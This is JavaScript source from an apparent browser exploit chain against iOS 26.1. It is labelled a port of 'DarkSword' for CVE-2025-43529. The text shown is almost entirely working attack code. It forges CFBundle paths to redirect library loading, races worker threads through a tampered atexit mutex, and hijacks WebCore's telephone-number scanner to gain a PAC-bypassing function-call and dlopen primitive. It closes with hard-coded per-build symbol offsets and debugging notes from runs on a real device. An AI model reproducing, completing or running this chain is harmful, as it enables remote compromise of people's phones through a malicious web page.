    // EARLY-OUT is worker1-wake-specific: it protects worker1's in-flight completion from the
    // re-zero below. In stage6 worker1 is already done and the leftover store/gen are stale, so
    // opts.skipEarlyOut (set by the stage6 fire) lets the fire through.
    if (!opts.skipEarlyOut && (p.read64(p.p_InterposeTupleAll_buffer) === p.attackerBuf || (p.read64(__A) >> 32n) !== 0n)) {
        postMessage(`[mapredir] EARLY-OUT: store=${p.read64(p.p_InterposeTupleAll_buffer) === p.attackerBuf} gen=${hex(p.read64(__A) >> 32n)} -- NO fire (worker1 awake; token untouched, completion legal on w1tok)`);
        return true;
    }
    const mr = setupMapRedirect();
    if (!mr) return false;
    // CRASH-PIN (2026-08-02, stage6 spare4 death): log the borrow's pre-forge state + the onceToken
    // so a fast spare-gate completion crash leaves the borrowed-bundle validity + token behind.
    slog(`[mapredir] FIRE ${path}: borrow=${hex(mr.borrow)} cf=${hex(mr.borrowCF)} cf.loaded=${(p.read64(mr.borrowCF + structs.CFBundle_loadedFlag) & 0xffn)} cf.exec=${hex(mr.savedExec)} tok=${hex(p.read64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken))}`);
    const cs = p.makeCString(path);
    // forge the exec path into the shared value-table CFString (a REAL object -- no autda issue),
    // same recipe as rearmCFBundleLoader. NOTE: the real TT CFBundle's execPath also points here,
    // but worker1's park path was already consumed by its in-flight dlopen.
    p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_dataPtr, cs.ptr);
    p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_length, cs.len);
    p.write64(mr.borrowCF + structs.CFBundle_execPath, offsets.CFNetwork__gConstantCFStringValueTable);
    p.write8(mr.borrowCF + structs.CFBundle_loadedFlag, 0n);
    p.write64(mr.borrow + structs.NSBundle_flags, 0x40008n);     // not-loaded state
    p.write64(mr.borrow + structs.NSBundle_lock, 0n);
    const l0 = dyldLoadedCount();
    p.write64(mr.slot, mr.borrow);                                  // TTS path -> borrowed REAL bundle
    p.noAtexitPark = true;
    atexitSilent();   // drop-proof through the re-zero + CAS + seed: worker1 CANNOT wake (cannot complete)
    p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);  // fresh CAS for the spare (loader stub early-rets on -1)
    const wakeCls = nextAVSpeechClass();                            // FRESH class -- +initialize fires once per class ever
    const spare = (p.spare_workers && p.spare_workers[opts.spareIdx || 0]) || p.sub_worker;
    if (!spare) { postMessage(`[mapredir] no spare worker (spareIdx ${opts.spareIdx || 0}) -- cannot fire`); return false; }
    postMessage(`[mapredir] spare-fire: plant ${hex(wakeCls)} on spare bitmap (spareIdx ${opts.spareIdx || 0}), close() on spare's thread`);
    slog(`[mapredir] FIRE-SPARE spareIdx=${opts.spareIdx || 0} cls=${hex(wakeCls)} tok=${hex(p.read64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken))}`);
    plantOnBitmap(workerBitmap(spare.ctx), wakeCls);
    postMessage({ type: 'fire_spare', spareIdx: opts.spareIdx || 0 });   // -> page closes the selected spare's bitmap -> gate CAS + fresh load on spare's thread
    // V5 CHOREOGRAPHY (2026-07-22): two gate executors remain (worker1's stage4 CAS + this spare
    // fire) -- the chain's Voice-load gate is gone. The 26.1 completion assert is
    // (own_port ^ token) >= 4 -> brk, and block completions fire at uncontrollable times (the
    // block's early-return path skips the session XPC when the load allows). Ordering:
    //   * mutex SILENT through the re-zero + CAS + seed, so worker1 CANNOT wake (cannot complete);
    //   * seed w1tok AT THE CAS -- worker1's completion is legal whenever it wakes;
    //   * arm the drop (0x101) -- the spare's registrations wake worker1;
    //   * FREEZE the spare (0x102 hold) once its first registration has released (gen flips) and
    //     worker1's own post-wake acquire has released (HELD clear) -- the spare's block then
    //     parks at its next __cxa_atexit and can NEVER complete on w1tok;
    //   * worker1 (past the mutex -- its store proves it) completes on w1tok -> token -1;
    //   * seed spareTok + release (0x101) -> the spare's late completion is legal too.
    const spareTok = BigInt(spare.threadPort) & ~3n;
    const A = offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState;
    let g0 = 0;
    while (p.read64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken) === 0n) {
        if ((g0 & 0x3fff) === 0) p.reestablishRead64();
        if (++g0 % 1000000 === 0) postMessage(`[mapredir] CAS-spin ${g0}: token still 0 (spare not in gate yet)`);
        await spinYield(g0);
        if (g0 % 2000000 === 0) postMessage({ type: 'fire_spare', spareIdx: opts.spareIdx || 0 });   // delivery retry (idempotent: a re-close on a spent plant is a no-op) -- in-page-reload attempts drop the first post
        if (g0 > 200000) { postMessage('[mapredir] CAS TIMEOUT (spare never entered the gate) -- seeding w1tok anyway'); break; }   // tight cap: the CAS lands in 1-444 spins when it works (200k = 450x margin); longer spins are the device-clobber hammer (vphone reboot 2026-07-22)
    }
    slog(`[mapredir] CAS exited after ${g0} spins tok=${hex(p.read64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken))} (0=timeout, nonzero=spare claimed)`);
    p.reestablishRead64();   // write64's small-value split path depends on read64 (the fire clobbers it)
    seedTokenVerify(BigInt(tok) & ~3n, 'ARM w1tok');   // worker1's completion (error-return OR fast) can fire at any time after its wake -> always legal from here. On vphone the spare's block then hangs in the session-XPC and never completes; its error-return (load failure) is covered by the gen-timeout spareTok below; its success-path completion is prevented by the gen-flip freeze.
    // COUNT-MATCHED ARM (2026-07-23): use worker1's ACTUAL park count (captured at stage4-end in
    // p.parkWord) instead of the fixed 0x101. The spare's drop then advertises the same count as
    // worker1's park-wait -> the psynch generation matches (worker1's stale mgen had count=3, the
    // fixed 0x101 count=1 never matched). HELD cleared (|~0x2) so the spare can still acquire.
    const __arm = ((p.parkWord !== undefined ? p.parkWord : 0x102n) & ~0x2n) | 0x1n;
    p.write64(A, __arm);
    postMessage(`[mapredir] spare CAS after ${g0} spins; drop armed count-matched ${hex(__arm)} (parkWord=${hex(p.parkWord)})`);
    // GEN-FLIP: the spare's first registration release bumps the wake generation (high half) and
    // drops to worker1. On timeout: the spare's load produced no registration -- its block may
    // early-return and complete; seed spareTok to keep ITS completion legal (worker1 is asleep).
    let frozeSpare = false;
    let g1 = 0;
    while ((p.read64(A) >> 32n) === 0n) {
        if ((g1 & 0x3fff) === 0) p.reestablishRead64();
        if (++g1 > 50000) break;   // ~18ms. NOT a tuning knob: measured over 5x25 attempts the flip is BIMODAL -- when it happens it lands at median ~400-840 spins (max ~2000), and otherwise it never happens at all. Nothing was ever observed flipping between 2k and 50k, so widening this (tried at 400k) rescues nothing. GEN TIMEOUT is "the drop did not occur", not "we stopped looking too early".
        await spinYield(g1);
    }
    if ((p.read64(A) >> 32n) === 0n) {
        // the spare's load errored (no registration): its block will early-return and complete
        // on the CURRENT token -- w1tok from the ARM seed -- which would brk the SPARE. Cover it:
        // switch to spareTok (worker1 is still asleep, so its completion is not in play yet).
        seedTokenVerify(spareTok, 'GEN-TIMEOUT spareTok');
        postMessage(`[mapredir] GEN TIMEOUT (no registration drop) -- seeded spareTok (spare error-return completion legal; worker1 still asleep)`);
    } else {
        // The drop fired (gen flip); worker1 was woken and MUST re-acquire the mutex to finish its
        // __cxa_atexit and reach the epilogue/store. The OLD code froze the mutex (0x102 HELD) the
        // instant it saw HELD clear -- which is right after the SPARE's own release, BEFORE worker1
        // re-acquired ("held-clear after 0 spins" in EVERY failing log) -> the freeze hard-blocked
        // worker1's re-acquire -> worker1 parked forever (lldb: still at __cxa_atexit+40 post-abort).
        // EXPERIMENT (2026-08-01, FREEZE-AFTER-STORE): the HELD-bit gate above could not tell
        // worker1's acquire from the SPARE's -- the spare runs ~71 __cxa_atexit registrations for
        // XOJIT, so HELD flickers constantly and the poll latched the spare ~71:1. Measured over 25
        // attempts: latching early (HELD-set seen in 4-68 spins) = 0/8 survival, because the 0x102
        // freeze lands before worker1 re-acquires and blocks the one thread that has to reach the
        // store. Timing out (~1s) = 10/15. The gate never protected worker1; it only decided how
        // soon the freeze hit it.
        // So: do NOT freeze here. Seed w1tok (worker1's completion must be legal from the moment it
        // wakes -- independent of the freeze) and let the store-sync below run with the mutex FREE.
        // The freeze moves to immediately after the store lands, where it can no longer block
        // worker1. Safe on this device: the spare's block does not complete inside the run at all
        // (`close() RETURNED` never fires; every autopsy shows onceToken still a live port, never
        // -1) -- per AGENTS.md §5s it hangs in the Bambi session XPC and answers ~13s later, so
        // parking it a few ms later is well inside that envelope.
        p.reestablishRead64();
        seedTokenVerify(BigInt(tok) & ~3n, 'ARM-PRE-STORE w1tok');
        postMessage(`[mapredir] drop seen (gen flip after ${g1} spins); seeded w1tok&~3, mutex LEFT FREE for worker1's re-acquire (freeze deferred to post-store)`);
    }
    // EARLY AUTOPSY (2026-07-22): log the borrowed-bundle load outcome for EVERY fire, right after
    // the gen-spin -- the error-return completions (vphone brks) and GEN TIMEOUTs (stalls) all
    // trace to whether this load actually ran. cf.loaded=1 + loadedNow>l0 = the redirect worked.
    fireAutopsy(mr, l0);
    // SYNC: spin until the woken worker's interpose store lands, so the TT-slot restore below can't
    // race the clone load. STAGE-AWARE (2026-08-02): stage5's store is worker1 writing the BUFFER
    // (RS+0xb8 == attackerBuf); stage6's store is worker2 writing the SIZE (== opts.wantSize). For
    // stage6 the buffer check is a FALSE POSITIVE (worker1's leftover buffer) -> the freeze below
    // fired before worker2 re-acquired and blocked it -> the size never landed (raced 3/4 runs).
    // Defer the freeze to worker2's REAL store.
    const __storeDone = () => opts.wantSize !== undefined
        ? p.read64(p.p_InterposeTupleAll_size) === opts.wantSize
        : p.read64(p.p_InterposeTupleAll_buffer) === p.attackerBuf;
    let g = 0;
    while (true) {
        if ((g & 0x3fff) === 0) p.reestablishRead64();   // the fire's heavy load clobbers read64Str
        if (__storeDone()) break;
        if (++g % 100000 === 0) {
            // WAKE-VS-STORE PROBE (2026-07-23): worker STILL PARKED (cxa needle present = the drop
            // never woke it) vs PAST it (needle gone = worker woke but the store failed -> forge
            // problem). Splits the two failure classes that both surface as "store NEVER LANDED".
            try {
                const __wk = p.dlopen_workers.find(w => (w.id & 0xffffffffn) === (opts.wantSize !== undefined ? 0x22222222n : 0x11111111n));
                const __cxa = offsets.libsystem_c__cxa_atexit + 0x28n;
                const __nu = [Number(__cxa & 0xffn), Number((__cxa >> 8n) & 0xffn), Number((__cxa >> 16n) & 0xffn), Number((__cxa >> 24n) & 0xffn), Number((__cxa >> 32n) & 0xffn)];
                const __still = p.search_once(__wk.stack_top, __wk.stack_bottom, __nu) !== 0n;
                postMessage(`[mapredir] store-spin ${g}: buffer=${hex(p.read64(p.p_InterposeTupleAll_buffer))} size=${hex(p.read64(p.p_InterposeTupleAll_size))} worker ${opts.wantSize !== undefined ? '2' : '1'} ${__still ? 'STILL PARKED at __cxa_atexit (drop never woke it)' : 'PAST __cxa_atexit (WOKE, store failed)'}`);
            } catch (e) { postMessage(`[mapredir] store-spin ${g}: probe ERR ${e && (e.message || e)}`); }
        }
        await spinYieldCool(g);
        if (g > 500000) { postMessage('[mapredir] store TIMEOUT (worker never interposed)'); break; }   // BOUNDED: the store trails the wake by ms when it works; 500k cool spins (~6s) is >100x margin. (The 2026-07-23 manual edit removed this cap -> 21.9M-spin uncapped hammer -> vphone reboot loop.)
    }
    postMessage(`[mapredir] spare store landed after ${g} spins (${opts.wantSize !== undefined ? 'size' : 'buffer'})`);
    // FREEZE (moved here 2026-08-01): worker1 is past the mutex now -- either its store landed, or
    // the spin gave up and the attempt is lost anyway -- so 0x102 can no longer block it. The
    // spare's next __cxa_atexit parks it, which is all the freeze was ever for; the tail below
    // (spareTok seed + 0x101 release) is unchanged and still expects frozeSpare.
    p.reestablishRead64();
    p.write64(A, 0x102n);
    frozeSpare = true;
    postMessage(`[mapredir] spare FROZEN at 0x102 (post-store)`);
    // COMPLETION WAIT (SHORT): token -> -1 = worker1 completed (on the w1tok seed from the freeze;
    // the spare is frozen and cannot complete). On vphone worker1's session-XPC NEVER answers (§5r:
    // 12s AND 60s both timed out), so a long wait is pure delay AND the frozen spare's held mutex
    // would stall the caption carrier's registrations. On the real device worker1 completes ~0.13s
    // after its store -- inside this short window. So: wait briefly for -1, then seed spareTok
    // UNCONDITIONALLY (the spare's completion is the only one left in play on vphone; on the real
    // device worker1's already fired on w1tok) and release the spare (0x101) -- the caption
    // carrier's own registrations then drop to it and its completion lands on spareTok -> legal.
    let g2 = 0;
    while (p.read64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken) !== 0xffffffffffffffffn) {
        if ((g2 & 0x3fff) === 0) p.reestablishRead64();
        if (++g2 > 60000) break;   // ~1-2s: real-device worker1 completes in ~0.13s; vphone never does
        await spinYield(g2);
    }
    const tokNow = p.read64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken);
    seedTokenVerify(spareTok, 'RELEASE spareTok');
    postMessage(`[mapredir] ${tokNow === 0xffffffffffffffffn ? `worker1 completed after ${g2} spins` : `completion not seen in ${g2} spins (token=${hex(tokNow)}; vphone-hang or already-done)`}; seeded spareTok&~3`);
    if (frozeSpare) p.write64(A, 0x101n);   // RELEASE: the next real unlock drops -> the spare resumes -> completes on spareTok
    if (frozeSpare) postMessage('[mapredir] spare released (0x101)');
    fireAutopsy(mr, l0);
    p.noAtexitPark = false;
    p.write64(mr.slot, mr.orig);                                    // restore real TT bundle
    p.write64(mr.borrow + structs.NSBundle_flags, mr.savedFlags);   // restore borrowed bundle
    p.write64(mr.borrowCF + structs.CFBundle_execPath, mr.savedExec);
    p.write8(mr.borrowCF + structs.CFBundle_loadedFlag, 1n);
    const l1 = dyldLoadedCount();
    postMessage(`[mapredir] wake via ${path}: loaded ${l0}->${l1}`);
    atexitPass();   // benign pass after the sync (count==gen): the spare is running, no sleeper to wake
    return l1 !== l0;
}
// TELEPHONE-GATE ARM (2026-08-02, real-device "SLOT NEVER INVOKED" fix): the tree builder only calls
// TelephoneNumberDetector::find from processCharacterBufferForInBody when
// Document::isTelephoneNumberParsingEnabled() (23B85 disasm 0x1a058cdac): [[doc+0x2d0]+0x2d2] bit3
// (settings().telephoneNumberParsingEnabled()) AND [doc+0xe0c] bit0 (m_isTelephoneNumberParsingAllowed).
// The preference is status:embedder, default FALSE (UnifiedWebPreferences.yaml
// TelephoneNumberParsingEnabled): an embedder that does not opt in NEVER runs the scan, so the
// planted slot is never called and the fcall sentinel survives -- exactly the real-device MARKER
// TEST abort (vphone's embedder opts in; same 23B85, same offsets). Force both fields on every
// HTMLDocument in allScriptExecutionContextsMap (same walk as stage3). Settings is shared per-Page
// (one arm covers later-created documents); the allowed byte defaults 1 (no format-detection meta
// on this page) and is forced anyway. quiet=true logs only failures (per-fcall re-arm).
function armTelephoneGate(tag, quiet, write = true) {
    try {
        const tab = p.read64(offsets.WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts);
        if (!tab) { postMessage(`[gate] ${tag}: contexts table NULL`); return false; }
        const len = p.read64(tab - 8n) >> 32n;
        const seen = new Set();
        const vtSeen = {};
        let docs = 0, armed = 0;
        for (let i = 0n; i < len; i++) {
            const b = tab + i * structs.ContextsMap_stride;
            if (!p.read64(b)) continue;                                  // empty bucket
            const ctx = p.read64(b + structs.ContextsMap_value);
            if (ctx < 0x100000000n || ctx > 0x10000000000n || seen.has(ctx)) continue;   // deleted(-1)/garbage bucket
            seen.add(ctx);
            const vt = noPAC(p.read64(ctx));
            const vtU = hex(vt - p.slide); vtSeen[vtU] = (vtSeen[vtU] || 0) + 1;
            if (vt !== offsets.WebCore__HTMLDocument_vtable) continue;
            docs++;
            const doc = ctx - structs.Document_secSubobjectOffset;   // map value = the SEC subobject (Document+0xd0)
            const settings = p.read64(doc + structs.Document_settings);
            // Settings is a runtime heap object (NOT cache-resident): accept the heap range too.
            // (Real-device run 2026-08-02: settings=0x10b24c4a0 was wrongly rejected as implausible.)
            if (!(settings > 0x100000000n && settings < 0x10000000000n) || (settings & 7n) !== 0n) { postMessage(`[gate] ${tag}: doc ${hex(doc)} settings implausible ${hex(settings)} -- skipped`); continue; }
            const sByte = (p.read64(settings + structs.Settings_telephoneParsing - 2n) >> 16n) & 0xffn;
            const aByte = (p.read64(doc + structs.Document_telephoneParsingAllowed - 4n) >> 32n) & 0xffn;
            if (write) {
                p.write8(settings + structs.Settings_telephoneParsing, sByte | 0x8n);
                p.write8(doc + structs.Document_telephoneParsingAllowed, aByte | 1n);
                armed++;
            } else if ((sByte & 0x8n) && (aByte & 0x1n)) armed++;   // check mode: gate already open
            if (!quiet || !write) postMessage(`[gate] ${tag}: doc ${hex(doc)} settings ${hex(settings)} byte ${hex(sByte)}${write ? `->${hex(sByte | 0x8n)}` : (sByte & 0x8n ? ' (parsing ENABLED)' : ' (PARSING OFF!)')} allowed ${hex(aByte)}${write ? `->${hex(aByte | 0x1n)}` : ''}`);
        }
        if (!docs) postMessage(`[gate] ${tag}: NO HTMLDocument in contexts map! vtables=${JSON.stringify(vtSeen)}`);
        else if (!quiet && write) postMessage(`[gate] ${tag}: armed ${armed}/${docs} HTMLDocument(s)`);
        return armed > 0;
    } catch (e) { postMessage(`[gate] ${tag} ERR ${e && (e.message || e)}`); return false; }
}
async function setupFcall() {
    if (p.fcallReady) return true;
    const offsets = p.offsets;
    slog('[sf] setupFcall entry');
    p.reestablishRead64();
    const paciza_invoker = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt);
    const paciza_security_invoker_1 = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage);
    const paciza_security_invoker_2 = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage);
    const paciza_dlopen = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation);
    const paciza_dlsym = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata);
    const paciza_signPointer = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddExif);
    slog('[sf] 6 globals read');
    postMessage(`[fcall] setup: invoker=${hex(paciza_invoker)} sec1=${hex(paciza_security_invoker_1)} sec2=${hex(paciza_security_invoker_2)} dlopen=${hex(paciza_dlopen)} dlsym=${hex(paciza_dlsym)} sign=${hex(paciza_signPointer)}`);
    // Unslide with the 39-bit noPAC mask, NOT 0xffffffffff (40-bit): arm64e addresses are 39-bit and
    // the PAC signature spills into bit 39, which VARIES per run (random PAC key). The 40-bit mask
    // caught that bit -> leakedExt=0x824cc2fb90 intermittently on the real device (want 0x24cc2fb90).
    const leakedExtUnslid = noPAC(paciza_invoker) - p.slide;
    if (leakedExtUnslid !== 0x24cc2fb90n) {
        postMessage(`[fcall] setup FAILED: leakedExt(unslid)=${hex(leakedExtUnslid)} (want 0x24cc2fb90) -- carrier/interpose did not land; aborting attempt`);
        return false;
    }
    p.paciza_invoker = paciza_invoker; p.paciza_security_invoker_1 = paciza_security_invoker_1;
    p.paciza_security_invoker_2 = paciza_security_invoker_2; p.paciza_dlopen = paciza_dlopen;
    p.paciza_dlsym = paciza_dlsym; p.paciza_signPointer = paciza_signPointer;
    // Preserve the REAL securityd ops table (a zeroed table hangs Security's XPC -- §5j). The global
    // holds a POINTER to the ops table; copy the table's real 0x20 ops (not the bss neighborhood).
    // LAZY-INIT HANDLING (2026-07-21, crash 220615.ips): at stage5 Security.framework is usually
    // NOT yet loaded, so gSecurityd reads 0 (the old flow reached setup at stage7, after the
    // MacinTalk/HomeUI wake had loaded it) -- and the copy loop then read64(0)'d -> EXC_BAD_ACCESS
    // at 0x0 in the chain worker. A 0 table is HARMLESS for the fcall: there are no securityd
    // users to protect, the per-call swap plants OUR table right before each trigger (the blraaz
    // always reads the global before the called pc runs), and any later Security init lands inside
    // a called dlopen -- AFTER the blraaz. So: preserve only when a real table exists, and skip
    // the restore when there was nothing to restore to (realGSecurityd stays 0n).
    const gSecurityd = new BigUint64Array(0x100 / 8);
    const gSecurityd_data_ptr = gSecurityd.data();
    const ptrPlausible = (v) => v > 0x180000000n && v < 0x210000000n;
    const realGSecurityd = p.read64(offsets.Security__gSecurityd);
    slog(`[sf] realGSecurityd=${hex(realGSecurityd)}`);
    if (ptrPlausible(realGSecurityd)) {
        p.realGSecurityd = realGSecurityd;
        for (let i = 0n; i < 0x20n; i++) gSecurityd[i] = p.read64(realGSecurityd + i * 8n);
        slog('[sf] gSecurityd table copied');
    } else {
        p.realGSecurityd = 0n;   // Security not loaded: swap-only, no restore (see note above)
        slog('[sf] gSecurityd=0 (Security not loaded) -- swap-only mode');
    }
    p.gSecurityd = gSecurityd; p.gSecurityd_data_ptr = gSecurityd_data_ptr;
    const slowFcallResult = new BigUint64Array(0x10 / 8);
    const slowFcallResult_data_ptr = slowFcallResult.data();
    slowFcallResult[8 / 8] = slowFcallResult_data_ptr - 0x18n;
    p.slowFcallResult = slowFcallResult;
    const invoker_x0 = new BigUint64Array(0x58);
    const invoker_x0_data_ptr = invoker_x0.data();
    invoker_x0[0x20 / 8] = slowFcallResult_data_ptr;
    invoker_x0[0x18 / 8] = invoker_x0_data_ptr;
    p.invoker_x0 = invoker_x0;
    // 26.1 FCALL TRIGGER (§5p): TelephoneNumberDetector::find -> slot(scannerObj) via blraaz; the
    // fake scanner IS invoker_x0, the slot is gadget1/gadget2. gadget1 reads x0..x2 from
    // [invoker_x0+0x28/0x30/0x38], blraaz gSecurityd[0x80]=pc, stores result at [[invoker_x0+0x20]].
    p.write8(offsets.WebCore__TND_supportedFlag, 1n);
    // ORDER (2026-08-02): set the scanner OBJECT before the once flag. If WebCore's scanner init
    // checks "is the object already set?" it adopts ours instead of lazily building a real scanner
    // on the first phone-number scan (real device: the scan ran but with a real scanner).
    p.write64(offsets.WebCore__TND_scannerObject, invoker_x0_data_ptr);
    p.write64(offsets.WebCore__TND_scannerOnce, 0xffffffffffffffffn);
    // ALSO patch TelephoneNumberDetector's ACTUAL scanner value (0x1eb084030) -- the detector may
    // read this global (not TND_scannerObject) for the scanner it passes to find(). Same fake.
    p.write64(offsets.WebCore__TelephoneNumberDetector_phoneNumbersScanner_value, invoker_x0_data_ptr);
    // GATE ARM (2026-08-02): force settings().telephoneNumberParsingEnabled + the document's allowed
    // byte on every HTMLDocument -- the embedder pref defaults FALSE, and without it the parser never
    // calls find() at all (real-device SLOT NEVER INVOKED despite correct gadgets/plants).
    armTelephoneGate('setup');
    // Per-call gSecurityd swap + restore (minimizes the hijacked window -- fresh-framework dlopens
    // do code-signature validation, so Security's XPC must see the real table outside each call).
    // When realGSecurityd is 0n (Security not yet loaded at stage5, 2026-07-21) the swap still
    // plants OUR table for the call, but the restore is SKIPPED -- there is no real table to
    // restore to, and writing 0 could clobber a table a mid-call dlopen just initialized.
    function slow_fcall_1(pc, x0 = 0n, x1 = 0n, x2 = 0n) {
        p.write64(offsets.WebCore__softLinkDDDFAScannerFirstResultInUnicharArray, paciza_security_invoker_1);
        gSecurityd[0x80 / 8] = pc;
        invoker_x0[0x28 / 8] = x0;
        invoker_x0[0x30 / 8] = x1;
        invoker_x0[0x38 / 8] = x2;
        p.write64(offsets.Security__gSecurityd, gSecurityd_data_ptr);
        const __g = p.read64(offsets.Security__gSecurityd);
        postMessage(`[fcall] pc=${hex(pc)} ${__g === gSecurityd_data_ptr ? 'FAST' : 'XPC-FALLBACK!'}`);
        // TND RE-ARM (2026-08-02): re-write the fake scanner + once right before the trigger. The
        // real device's scan lazily initializes a REAL DataDetectors scanner on first use, so arm
        // ours at the exact moment of the trigger (setupFcall's write may predate the init).
        p.write8(offsets.WebCore__TND_supportedFlag, 1n);
        p.write64(offsets.WebCore__TND_scannerObject, invoker_x0_data_ptr);
        p.write64(offsets.WebCore__TND_scannerOnce, 0xffffffffffffffffn);
        p.write64(offsets.WebCore__TelephoneNumberDetector_phoneNumbersScanner_value, invoker_x0_data_ptr);
        armTelephoneGate('rearm1', true);   // re-force the parsing-enabled gate at trigger time (quiet)
        return new Promise(r => {
            slow_fcall_resolve = (val) => { slow_fcall_resolve = null; if (p.realGSecurityd !== 0n) p.write64(offsets.Security__gSecurityd, p.realGSecurityd); r(val); };
            // SENTINEL (2026-08-02): overwritten by the gadget iff it actually runs. If it survives,
            // the detector scan never called the slot -> trigger issue, not a dlopen failure.
            p.slowFcallResult[0] = 0xfeedfacecafebeefn;
            self.postMessage({ type: 'slow_fcall' });
            // POLL (2026-08-02, real device): the detector scan can run ASYNC after the page's write
            // returns, so the gadget may write the result AFTER slow_fcall_done arrives (vphone writes
            // it synchronously -> fast resolve). Poll the slot up to ~2s instead of resolving on the
            // message alone. slow_fcall_done now only probes; this poll is the sole resolver.
            let __p = 0;
            const __iv = setInterval(() => {
                const __v = p.slowFcallResult[0];
                if (__v !== 0xfeedfacecafebeefn || ++__p > 400) {
                    clearInterval(__iv);
                    if (slow_fcall_resolve) slow_fcall_resolve(__v !== 0xfeedfacecafebeefn ? __v : 0xdeaddeadn);
                }
            }, 5);
            setTimeout(() => { if (slow_fcall_resolve) slow_fcall_resolve(0xdeaddeadn); }, 3000);
        });
    }
    function slow_fcall_2(pc, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n) {
        p.write64(offsets.WebCore__softLinkDDDFAScannerFirstResultInUnicharArray, paciza_security_invoker_2);
        gSecurityd[0xc0 / 8] = pc;
        invoker_x0[0x28 / 8] = x0; invoker_x0[0x30 / 8] = x1; invoker_x0[0x38 / 8] = x2;
        invoker_x0[0x40 / 8] = x3; invoker_x0[0x48 / 8] = x4; invoker_x0[0x50 / 8] = x5;
        p.write64(offsets.Security__gSecurityd, gSecurityd_data_ptr);
        // TND RE-ARM (2026-08-02): same as slow_fcall_1 -- arm the fake scanner at trigger time.
        p.write8(offsets.WebCore__TND_supportedFlag, 1n);
        p.write64(offsets.WebCore__TND_scannerObject, invoker_x0_data_ptr);
        p.write64(offsets.WebCore__TND_scannerOnce, 0xffffffffffffffffn);
        p.write64(offsets.WebCore__TelephoneNumberDetector_phoneNumbersScanner_value, invoker_x0_data_ptr);
        armTelephoneGate('rearm2', true);   // re-force the parsing-enabled gate at trigger time (quiet)
        return new Promise(r => {
            slow_fcall_resolve = (val) => { slow_fcall_resolve = null; if (p.realGSecurityd !== 0n) p.write64(offsets.Security__gSecurityd, p.realGSecurityd); r(val); };
            p.slowFcallResult[0] = 0xfeedfacecafebeefn;
            self.postMessage({ type: 'slow_fcall' });
            let __p = 0;
            const __iv = setInterval(() => {
                const __v = p.slowFcallResult[0];
                if (__v !== 0xfeedfacecafebeefn || ++__p > 400) {
                    clearInterval(__iv);
                    if (slow_fcall_resolve) slow_fcall_resolve(__v !== 0xfeedfacecafebeefn ? __v : 0xdeaddeadn);
                }
            }, 5);
            setTimeout(() => { if (slow_fcall_resolve) slow_fcall_resolve(0xdeaddeadn); }, 3000);
        });
    }
    function slow_dlopen(filename, flags) { const name = p.makeCString(filename); return slow_fcall_1(paciza_dlopen, name.ptr, flags); }
    function slow_dlsym(handle, symbol) { const sym = p.makeCString(symbol); return slow_fcall_1(paciza_dlsym, handle, sym.ptr); }
    p.slow_fcall_1 = slow_fcall_1; p.slow_fcall_2 = slow_fcall_2;
    p.slow_dlopen = slow_dlopen; p.slow_dlsym = slow_dlsym;
    p.fcallReady = true;
    postMessage(`[fcall] setup READY (leakedExt unslid=${hex(leakedExtUnslid)}; realGSecurityd=${hex(realGSecurityd)})`);
    return true;
}


let slow_fcall_resolve;

function bigintFromBytes(bytes) {
    for (let i = 0; i < 8; ++i) u8[i] = bytes[i];
    return u64[0];
}

// =====================================================================
//  CVE-2025-43529 exploit chain  (iOS 26.1 / build 23B85)  -- port of DarkSword
//
//  Stage layout (each is its own onmessage case so the main thread can
//  orchestrate the later, multi-worker stages):
//    stage1 : UAF -> addrof/fakeobj -> scribble -> arbitrary read64/write64,
//             then immediately disable GC so the fake cells survive. Everything is
//             parked in the global `p` object so later stages (and later workers)
//             can reuse it.
//    stage2 : leak the JSC slide, open the JIT allowlist, and locate the worker
//             contexts -- all on top of p.read64/p.write64.
//    stage3+: dlopen-worker dance + dyld-interposing PAC bypass (not yet ported)
//
//  THIS HAS TO RUN IN A WEB WORKER so the scope is added to
//  WebCore::allScriptExecutionContextsMap (stage2 walks that map).
// =====================================================================

// =====================================================================
//  Per-build offset tables. Select the target with TARGET_BUILD below.
//    syms    = absolute (un-slid) symbol VAs from the dyld_shared_cache
//    structs = C++/JSC struct field offsets (object layout, per build)
//  Everything version-specific lives here so the chain stays portable:
//  to retarget another iOS build, add a sibling key and fill both tables.
// =====================================================================
const VERSIONS = {
    // iOS 26.1  /  build 23B85  /  iPhone17,3  (vphone target)
    "23B85": {
        syms: {
            "__pthread_head": 0x1ed3f8020n,
            "AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken": 0x1ed745410n,
            "AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker": 0x1ed744f30n,
            "AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest": 0x1ed744e68n,
            "AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice": 0x1ed744f08n,
            "AVFAudio__OBJC_CLASS__AVSpeechUtterance": 0x1ed744300n,
            "AVFAudio__OBJC_CLASS__AVSpeechSynthesizer": 0x1ed744df0n, // wake pool (fresh +initialize class)
            "AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderVoice": 0x1ed7450e8n, // wake pool
            "AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderAudioUnit": 0x1ed745070n, // wake pool
            "AVFAudio__OBJC_CLASS__AVVCMetricsManager": 0x1ed744918n, // wake target 3: -init -> dlopen(libAudioIssueDetector) (deferred-loader-pairs.md (c))
